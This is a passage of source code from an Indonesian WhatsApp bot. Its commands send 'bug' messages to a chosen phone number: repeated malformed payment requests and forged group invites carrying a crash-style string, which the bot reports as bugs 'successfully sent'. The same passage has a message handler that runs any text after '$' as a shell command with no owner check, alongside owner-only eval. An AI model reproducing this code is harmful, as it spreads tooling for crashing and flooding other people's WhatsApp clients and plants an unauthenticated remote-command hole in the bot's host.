if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku lennzzxy`
for (let i = 0; i < jumlah; i++) {
haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER Xyrvzaa`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/@LennX-MODS`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
case 'buggastick':{
if (!isCreator) return m.reply(mess.owner)
haikal.sendImageAsSticker(from, fs.readFileSync('./baseikal/stickernye/SuksesCok.webp'), m, { packname: global.packname, author: global.author, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281717802873',
title: `Xyrvzaa`,
sourceUrl: `https://wa.me/6281717802873`, 
thumbnail: virgam
}
}}, { text:`haha` }, { quoted: m})
}
break
case 'buggamvn':{
if (!isCreator) return m.reply(mess.owner)
haikal.sendMessage(m.chat, {audio: fs.readFileSync('./baseikal/sound/ketawa.mp3'), mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281717802873',
title: `Xyrvzaa`,
sourceUrl: `https://wa.me/6281717802873`, 
thumbnail: virgam
}
}}, { text:`haha` }, { quoted: m})
}
break
//=================================================//
case 'sendinvite': case 'sendinvite2': case 'sendinvite3': case 'sendinvite4': case 'sendinvite5':{
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME Xyrvzaa${ngazap(prefix)}`,
"groupName": `MY NAME Xyrvzaa${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, groupInvite.message, { messageId: groupInvite.key.id })
m.reply(`Sukses Mengirim Bug Ke ${bnnd} !!!`)
}
break

//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
